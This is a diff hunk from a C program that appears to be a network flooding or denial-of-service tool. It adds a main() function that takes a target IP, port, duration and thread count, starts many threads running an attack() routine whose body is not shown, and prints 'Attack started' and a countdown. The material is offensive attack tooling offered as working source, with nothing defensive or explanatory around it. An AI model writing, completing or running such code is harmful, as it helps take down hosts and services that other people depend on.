@@ -104,4 +104,40 @@ void *attack(void *arg) {
     pthread_exit(NULL);
 }
 
-// Rest of the main() function remains identical to previous version
+int main(int argc, char *argv[]) {
+    if (argc < 4 || argc > 5) {
+        usage();
+    }
+
+    char *ip = argv[1];
+    int port = atoi(argv[2]);
+    int time = atoi(argv[3]);
+    int threads = (argc == 5) ? atoi(argv[4]) : DEFAULT_THREADS;
+
+    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
+    struct thread_data data = {ip, port, time};
+
+    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);
+
+    for (int i = 0; i < threads; i++) {
+        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
+            perror("Thread creation failed");
+            free(thread_ids);
+            exit(1);
+        }
+    }
+
+    for (int remaining_time = time; remaining_time > 0; remaining_time--) {
+        printf("Time remaining: %d seconds\r", remaining_time);
+        fflush(stdout);
+        sleep(1);
+    }
+
+    for (int i = 0; i < threads; i++) {
+        pthread_join(thread_ids[i], NULL);
+    }
+
+    free(thread_ids);
+    printf("\nAttack finished\n");
+    return 0;
+}
